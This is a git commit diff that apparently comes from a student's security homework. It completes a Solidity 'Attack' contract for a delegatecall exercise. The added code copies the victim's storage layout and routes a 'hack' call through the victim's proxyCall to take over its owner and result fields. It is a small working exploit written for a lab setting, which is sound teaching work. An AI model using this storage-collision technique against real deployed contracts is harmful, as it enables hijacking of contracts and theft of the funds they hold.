3e93e4b689a936c9445212a2947928e493e056e8
joel0115 <joel0115@gmail.com>
2024-03-16 21:33:31 +0800

    Delegation completed

--- hw1/src/Delegation/Delegation.sol
+++ hw1/src/Delegation/Delegation.sol
@@ -7,6 +7,13 @@ interface ID31eg4t3 {
 }
 
 contract Attack {
+    uint256 var0 = 12345;
+    uint8 var1 = 32;
+    string private var2;
+    address private var3;
+    uint8 private var4;
+    address public owner;
+    mapping(address => bool) public result;
     address internal immutable victim;
     // TODO: Declare some variable here
     // Note: Checkout the storage layout in victim contract
@@ -16,10 +23,16 @@ contract Attack {
     }
 
     // NOTE: You might need some malicious function here
+    function hack(address hacker) public{
+        result[hacker] = true;
+        owner = hacker;
+    }
 
     function exploit() external {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
+        bytes memory data = abi.encodeWithSignature("hack(address)", msg.sender);
+        ID31eg4t3(victim).proxyCall(data);
     }
 }
